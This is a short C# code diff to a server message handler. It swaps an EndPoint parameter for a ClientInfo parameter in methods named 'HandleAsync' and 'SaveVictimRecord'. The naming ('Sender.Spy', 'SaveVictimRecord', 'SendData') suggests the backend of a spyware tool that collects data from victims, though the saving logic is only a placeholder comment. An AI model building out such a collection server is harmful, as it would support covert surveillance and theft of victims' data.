@@ -15,14 +15,14 @@ namespace Server.Handlers
             return message.Sender == Sender.Spy;
         }
 
-        public async Task<string> SaveVictimRecord(SpyMessage message, EndPoint endPoint)
+        public async Task<string> SaveVictimRecord(SpyMessage message, ClientInfo clientInfo)
         {
             // logic to save victim record data
 
             return _director.GetSuccessResponse().ToString();
         }
 
-        public async Task<string> HandleAsync(SpyMessage? message, EndPoint endPoint)
+        public async Task<string> HandleAsync(SpyMessage? message, ClientInfo clientInfo)
         {
             if (message == null)
                 return _director.GetBadRequestResponse().ToString();
@@ -32,7 +32,7 @@ namespace Server.Handlers
             switch (message.Action)
             { 
                 case MessageAction.SendData:
-                    response = await SaveVictimRecord(message, endPoint);
+                    response = await SaveVictimRecord(message, clientInfo);
                     break;
                 default:
                     response = _director.GetNotFoundRequestResponse().ToString();
